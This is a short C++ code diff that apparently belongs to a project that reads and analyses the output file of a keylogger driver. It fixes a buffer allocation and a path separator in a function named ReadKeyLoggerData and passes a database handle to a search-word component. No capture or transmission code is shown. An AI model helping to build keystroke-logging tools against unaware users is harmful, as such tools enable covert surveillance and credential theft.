@@ -12,7 +12,7 @@ m_hDataBase(hDataBase)
 		ErrorLog("Fail to execute sampling");
 	}
 
-	m_pSearchWord = new CSearchWord();
+	m_pSearchWord = new CSearchWord(m_hDataBase);
 	if (m_pSearchWord == NULL) {
 		ErrorLog("Fail to exeucte search word");
 	}
@@ -73,11 +73,11 @@ DWORD CAnalyzer::ReadKeyLoggerData(std::string &refstrSearchWord)
 {
 	FILE *pFile = NULL;
 
-	LPWSTR lpwBuffer = NULL;
+	TCHAR lpwBuffer[512] = { 0 };
 	GetCurrentDirectory(512, lpwBuffer);
 	std::wstring strBuffer = lpwBuffer;
 	std::wstring strFileName = DRIVER_OUTPUT_FILE_NAME;
-	strBuffer += L"/" + strFileName;
+	strBuffer += L"\\" + strFileName;
 
 	/*
 		check whether file exist on file path indicated	
